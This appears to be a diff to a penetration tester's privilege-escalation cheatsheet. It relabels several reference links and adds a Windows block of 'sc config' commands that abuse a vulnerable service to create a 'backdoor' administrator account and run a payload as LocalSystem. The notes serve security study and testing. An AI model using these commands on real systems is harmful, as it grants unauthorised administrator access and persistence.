@@ -149,10 +149,10 @@ Linux privesc:
 * https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/  
 
 Windows privesc:
-* https://github.com/azmatt/windowsEnum (automated scan)
+* Automated scanner: https://github.com/azmatt/windowsEnum
 * http://www.exumbraops.com/penetration-testing-102-windows-privilege-escalation-cheatsheet/
 * https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md
-* http://www.fuzzysecurity.com/tutorials/16.html
+* Accesschk.exe: http://www.fuzzysecurity.com/tutorials/16.html
 
 Questions to ask:
 * User RWX permissions enabled on files/directories
@@ -190,9 +190,14 @@ uname -a
 ```
 
 Windows Privesc:
-```
-# Find a file recursively
-dir filename.exe /S /B
+```powershell
+# Vulnerable services
+sc qc <vulnerable service name>
+sc config <vuln-service> binpath= "net user backdoor backdoor123 /add" 
+sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add" 
+
+sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
+net start <vulnerable-service>
 ```
 
 Summarise possible attack vectors / vulnerable services to escalate privileges.
